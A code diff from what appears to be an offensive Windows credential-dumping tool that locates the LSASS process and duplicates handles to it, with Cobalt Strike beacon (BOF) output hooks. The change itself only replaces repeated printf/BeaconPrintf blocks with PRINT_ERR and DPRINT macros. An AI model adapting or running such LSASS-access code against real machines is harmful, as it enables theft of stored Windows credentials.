@@ -102,13 +102,7 @@ HANDLE find_lsass(DWORD dwFlags)
         );
         if (status == STATUS_NO_MORE_ENTRIES)
         {
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "The LSASS process was not found. Are you elevated?\n"
-            );
+            PRINT_ERR("The LSASS process was not found. Are you elevated?");
             return NULL;
         }
         if (!NT_SUCCESS(status))
@@ -155,12 +149,8 @@ HANDLE get_process_handle(
     {
         if (!quiet)
         {
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "There is no process with the PID %ld.\n",
+            PRINT_ERR(
+                "There is no process with the PID %ld.",
                 dwPid
             );
         }
@@ -170,12 +160,8 @@ HANDLE get_process_handle(
     {
         if (!quiet)
         {
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Could not open a handle to %ld. Are you elevated?\n",
+            PRINT_ERR(
+                "Could not open a handle to %ld. Are you elevated?",
                 dwPid
             );
         }
@@ -267,13 +253,7 @@ PPROCESS_LIST get_processes_from_handle_table(
         {
             if (process_list->Count + 1 > MAX_PROCESSES)
             {
-#ifdef BOF
-                BeaconPrintf(CALLBACK_ERROR,
-#else
-                printf(
-#endif
-                    "Too many processes, please increase MAX_PROCESSES\n"
-                );
+                PRINT_ERR("Too many processes, please increase MAX_PROCESSES");
                 intFree(process_list); process_list = NULL;
                 return NULL;
             }
@@ -336,15 +316,7 @@ BOOL GetTypeIndexByName(PULONG ProcesTypeIndex)
         }
         CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
     }
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Index of type 'Process' not found\n"
-        );
-#endif
+    DPRINT_ERR("Index of type 'Process' not found");
     return FALSE;
 }
 
@@ -438,17 +410,11 @@ HANDLE duplicate_lsass_handle(
             if (is_lsass(hDuped))
             {
                 // found LSASS handle
-#ifdef DEBUG
-#ifdef BOF
-                BeaconPrintf(CALLBACK_OUTPUT,
-#else
-                printf(
-#endif
-                    "Found LSASS handle: 0x%x, on process: %d\n",
+                DPRINT(
+                    "Found LSASS handle: 0x%x, on process: %d",
                     handleInfo->HandleValue,
                     handleInfo->UniqueProcessId
                 );
-#endif
                 intFree(handleTableInformation); handleTableInformation = NULL;
                 intFree(process_list); process_list = NULL;
                 NtClose(hProcess); hProcess = NULL;
@@ -462,14 +428,7 @@ HANDLE duplicate_lsass_handle(
         }
     }
 
-#ifdef BOF
-    BeaconPrintf(CALLBACK_ERROR,
-#else
-    printf(
-#endif
-        "No handle to the LSASS process was found\n"
-    );
-
+    PRINT_ERR("No handle to the LSASS process was found");
     intFree(handleTableInformation); handleTableInformation = NULL;
     intFree(process_list); process_list = NULL;
     return NULL;
